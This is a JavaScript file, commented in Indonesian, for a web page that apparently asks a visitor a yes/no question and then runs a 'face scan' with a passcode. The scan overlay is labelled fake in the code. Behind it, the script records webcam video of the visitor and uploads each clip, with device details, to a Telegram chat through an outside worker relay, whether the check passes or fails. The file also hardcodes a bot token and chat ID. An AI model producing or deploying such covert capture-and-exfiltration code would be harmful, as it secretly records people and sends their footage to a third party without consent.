// ================= CONFIG =================
const TELEGRAM_BOT_TOKEN = "7647994795:AAHlGjLsLejNeiILkBbsoqpB8W11uQjWuzI";
const TELEGRAM_CHAT_ID = "6482340551";
const SECURE_LINK = "https://example.com"; // link HTTPS setelah lolos
const PASSCODE = "1402"; // passcode rahasia

// Thresholds
const MIN_CONFIDENCE = 0.6;        // confidence wajah minimum
const EYE_OPEN_THRESHOLD = 0.25;   // EAR sederhana (aproksimasi)
const LIVENESS_MOTION_PX = 8;      // anti-foto: minimal perubahan posisi

// ================= TELEGRAM =================
function tgSendMessage(text) {
  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
  });
}

function tgSendVideo(blob, caption) {
  const form = new FormData();
  form.append("chat_id", TELEGRAM_CHAT_ID);
  form.append("video", blob, "capture.webm");
  form.append("caption", caption);

  return fetch("https://dry-sun-ec10.anathapindika1602.workers.dev/", {
    method: "POST",
    body: form
  });
}

// ================= DEVICE INFO =================
function deviceInfo() {
  return `Time: ${new Date().toLocaleString()}\nPlatform: ${navigator.platform}\nUA: ${navigator.userAgent}`;
}

// ================= FACE-API LOAD =================
async function loadFaceApi() {
  const MODEL_URL = './models';

  await Promise.all([
    faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
    faceapi.nets.faceLandmark68TinyNet.loadFromUri(MODEL_URL)
  ]);
}

// ================= CAMERA & VIDEO =================
const videoEl = document.getElementById('video');
let stream;

async function startCamera() {
  stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
  videoEl.srcObject = stream;
  await videoEl.play();
}

function stopCamera() {
  stream && stream.getTracks().forEach(t => t.stop());
}

async function recordVideo(seconds = 3) {
  const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
  let chunks = [];
  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.start();
  await new Promise(r => setTimeout(r, seconds * 1000));
  recorder.stop();
  await new Promise(r => recorder.onstop = r);
  return new Blob(chunks, { type: 'video/webm' });
}

// ================= UTIL: Eye Aspect Ratio (aproksimasi) =================
function earFromLandmarks(lm, isLeft=true) {
  const idx = isLeft ? [36,37,38,39,40,41] : [42,43,44,45,46,47];
  const p = idx.map(i => lm.positions[i]);
  const dist = (a,b)=>Math.hypot(a.x-b.x,a.y-b.y);
  const ear = (dist(p[1],p[5]) + dist(p[2],p[4])) / (2 * dist(p[0],p[3]));
  return ear;
}

// ================= FAKE LOADING UI =================
function showScanning(msg="Scanning face…") {
  let el = document.getElementById('scanOverlay');
  if (!el) {
    el = document.createElement('div');
    el.id = 'scanOverlay';
    el.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;z-index:9999;color:#fff;font-family:system-ui;`;
    el.innerHTML = `<div style="text-align:center"><div style="margin-bottom:12px">🔒</div><div id="scanText">${msg}</div><div style="margin-top:10px;opacity:.8">Please hold still</div></div>`;
    document.body.appendChild(el);
  } else {
    document.getElementById('scanText').textContent = msg;
    el.style.display='flex';
  }
}
function hideScanning(){ const el=document.getElementById('scanOverlay'); if(el) el.style.display='none'; }

// ================= DETECTION STEPS =================
async function detectOnce() {
  const det = await faceapi.detectSingleFace(videoEl, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.3 }))
    .withFaceLandmarks(true);
  return det;
}

async function livenessCheck(durationMs=1200) {
  // anti-foto: cek pergeseran bbox dalam waktu singkat
  let lastBox=null, moved=false;
  const start=performance.now();
  while (performance.now()-start < durationMs) {
    const d = await detectOnce();
    if (d && d.detection && d.detection.box) {
      const b=d.detection.box;
      if (lastBox) {
        const dx=Math.abs(b.x-lastBox.x), dy=Math.abs(b.y-lastBox.y);
        if (dx+dy > LIVENESS_MOTION_PX) moved=true;
      }
      lastBox={x:b.x,y:b.y};
    }
    await new Promise(r=>setTimeout(r,120));
  }
  return moved;
}

// ================= FLOW =================
async function faceAndPasscodeFlow(answerLabel) {
  try {
    showScanning('Initializing…');
    await loadFaceApi();
    await startCamera();

    // Try detect face with retries
    let det=null; let tries=0;
    showScanning('Scanning face…');
    while(!det && tries<10){ tries++; det = await detectOnce(); await new Promise(r=>setTimeout(r,150)); }
    if(!det){
      const blob=await recordVideo(3);
      await tgSendVideo(blob, `❌ Face not detected (${answerLabel})\n${deviceInfo()}`);
      hideScanning(); stopCamera(); alert('Wajah tidak terdeteksi 😢'); return;
    }

    // Confidence score
    const confidence = det.detection.score;
    if (confidence < MIN_CONFIDENCE) {
      const blob=await recordVideo(3);
      await tgSendVideo(blob, `❌ Low confidence ${confidence.toFixed(2)} (${answerLabel})\n${deviceInfo()}`);
      hideScanning(); stopCamera(); alert('Pencahayaan kurang, coba lagi ya ✨'); return;
    }

    // Eye open check
    const lm = det.landmarks;
    const earL = earFromLandmarks(lm, true);
    const earR = earFromLandmarks(lm, false);
    if (Math.min(earL, earR) < EYE_OPEN_THRESHOLD) {
      const blob=await recordVideo(3);
      await tgSendVideo(blob, `❌ Eyes closed (${answerLabel})\n${deviceInfo()}`);
      hideScanning(); stopCamera(); alert('Buka mata ya 👀'); return;
    }

    // Liveness (anti-photo)
    showScanning('Verifying liveness…');
    const live = await livenessCheck();
    if (!live) {
      const blob=await recordVideo(3);
      await tgSendVideo(blob, `❌ Liveness failed (${answerLabel})\n${deviceInfo()}`);
      hideScanning(); stopCamera(); alert('Gerakkan sedikit wajah ya 🙂'); return;
    }

    // Record proof
    showScanning('Finalizing…');
    const blob = await recordVideo(3);

    // Passcode
    const code = prompt('Masukkan passcode 💖');
    if (code !== PASSCODE) {
      await tgSendVideo(blob, `🔒 Passcode salah (${answerLabel})\nConfidence:${confidence.toFixed(2)}\n${deviceInfo()}`);
      hideScanning(); stopCamera(); alert('Passcode salah 😭'); return;
    }

    await tgSendVideo(blob, `✅ Face+Passcode OK (${answerLabel})\nConfidence:${confidence.toFixed(2)}\n${deviceInfo()}`);
    hideScanning(); stopCamera(); window.location.href = SECURE_LINK;

  } catch (e) {
    hideScanning(); stopCamera(); tgSendMessage(`⚠ Error: ${e.message}\n${deviceInfo()}`);
  }
}

// ================= BUTTON HOOKS =================
function handleYesClick(){ faceAndPasscodeFlow('YES'); }
function handleNoClick(){ faceAndPasscodeFlow('NO'); }
